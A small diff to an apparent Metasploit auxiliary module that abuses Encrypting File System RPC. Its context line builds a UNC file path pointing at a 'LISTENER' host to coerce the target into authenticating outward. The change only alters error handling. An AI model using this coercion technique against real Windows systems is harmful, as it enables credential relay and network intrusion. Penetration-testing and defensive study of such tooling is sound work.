@@ -94,6 +94,7 @@ class MetasploitModule < Msf::Auxiliary
         method,
         file_name: "\\\\#{datastore['LISTENER']}\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\#{Rex::Text.rand_text_alphanumeric(4..8)}.#{Rex::Text.rand_text_alphanumeric(3)}"
       )
+      next if response.nil?
 
       error_status = response.error_status.to_i
       win32_error = ::WindowsError::Win32.find_by_retval(error_status).first
@@ -116,7 +117,8 @@ class MetasploitModule < Msf::Auxiliary
     begin
       raw_response = dcerpc.call(request.opnum, request.to_binary_s)
     rescue Rex::Proto::DCERPC::Exceptions::Fault => e
-      fail_with(Failure::UnexpectedReply, "The #{name} Encrypting File System RPC request failed (#{e.message}).")
+      print_error "The #{name} Encrypting File System RPC request failed (#{e.message})."
+      return nil
     end
 
     EncryptingFileSystem.const_get("#{name}Response").read(raw_response)
